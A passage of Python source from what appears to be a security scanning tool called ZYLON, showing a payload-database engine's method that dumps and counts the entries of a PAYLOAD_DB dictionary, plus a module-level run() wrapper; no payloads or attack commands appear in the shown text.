            file_path = kwargs.get('file_path', target or '')
            category = kwargs.get('category', 'custom')
            return self.import_payloads(file_path, category)
        elif scan_type == 'full_db':
            return self._full_db_dump()
        else:
            return self.list_categories()

    def _full_db_dump(self):
        """Dump the entire payload database

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Payload DB: Full Database Dump{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "database": {},
                "total_payloads": 0,
                "total_categories": 0,
            },
            "scan_type": "payload_full_db",
        }

        total = 0
        for attack_type, categories in PAYLOAD_DB.items():
            result["details"]["database"][attack_type] = {}
            for sub_cat, payloads in categories.items():
                result["details"]["database"][attack_type][sub_cat] = payloads
                total += len(payloads)

        result["details"]["total_payloads"] = total
        result["details"]["total_categories"] = len(PAYLOAD_DB)

        result["findings"].append({
            "type": "full_db",
            "description": f"Complete payload database: {len(PAYLOAD_DB)} categories, {total} total payloads",
            "categories": len(PAYLOAD_DB),
            "total_payloads": total,
        })

        self._print(f"  [+] {len(PAYLOAD_DB)} categories, {total} total payloads in database", GREEN)
        return result


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target=None, scan_type='list', **kwargs):
    """Module-level run function for ZYLON integration"""
    engine = PayloadDBEngine()
    return engine.run(target=target, scan_type=scan_type, **kwargs)
